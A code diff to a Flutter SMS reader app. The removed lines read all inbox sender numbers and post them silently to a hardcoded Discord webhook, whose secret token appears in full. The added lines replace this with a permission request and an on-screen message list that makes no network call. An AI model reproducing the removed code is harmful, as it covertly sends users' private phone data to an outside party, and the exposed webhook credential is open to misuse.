@@ -1,8 +1,9 @@
 import 'package:flutter/material.dart';
-import 'package:flutter_sms/flutter_sms.dart';
-import 'package:http/http.dart as http';
+import 'package:telephony/telephony.dart';
 
-void main() => runApp(MyApp());
+void main() {
+  runApp(MyApp());
+}
 
 class MyApp extends StatelessWidget {
   @override
@@ -19,41 +20,29 @@ class SMSReaderApp extends StatefulWidget {
 }
 
 class _SMSReaderAppState extends State<SMSReaderApp> {
-  List<String> senderNumbers = [];
+  final Telephony telephony = Telephony.instance;
+  List<SmsMessage> smsMessages = [];
 
   @override
   void initState() {
     super.initState();
-    _fetchSMS();
+    _requestPermissionsAndReadSMS();
   }
 
-  Future<void> _fetchSMS() async {
-    final messages = await FlutterSms().getInboxMessages;
-    for (var message in messages) {
-      String senderNumber = message.address;
-      senderNumbers.add(senderNumber);
-    }
-    setState(() {});
-    _sendToDiscord(senderNumbers);
-  }
-
-  Future<void> _sendToDiscord(List<String> numbers) async {
-    final webhookUrl = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU';
-    final message = 'SMS Sender Numbers: ${numbers.join(", ")}';
-    
-    final response = await http.post(
-      Uri.parse(webhookUrl),
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: '{"content": "$message"}',
-    );
-
-    if (response.statusCode == 204) {
-      print('Message sent to Discord successfully');
+  Future<void> _requestPermissionsAndReadSMS() async {
+    bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
+    if (permissionsGranted != null && permissionsGranted) {
+      _getSMSMessages();
     } else {
-      print('Failed to send message to Discord');
+      // Handle permission denied or null case
     }
+  }
+
+  Future<void> _getSMSMessages() async {
+    List<SmsMessage> messages = await telephony.getInboxSms();
+    setState(() {
+      smsMessages = messages;
+    });
   }
 
   @override
@@ -63,10 +52,11 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
         title: Text('SMS Reader App'),
       ),
       body: ListView.builder(
-        itemCount: senderNumbers.length,
+        itemCount: smsMessages.length,
         itemBuilder: (context, index) {
           return ListTile(
-            title: Text('Sender Number: ${senderNumbers[index]}'),
+            title: Text('From: ${smsMessages[index].address}'),
+            subtitle: Text('Message: ${smsMessages[index].body}'),
           );
         },
       ),
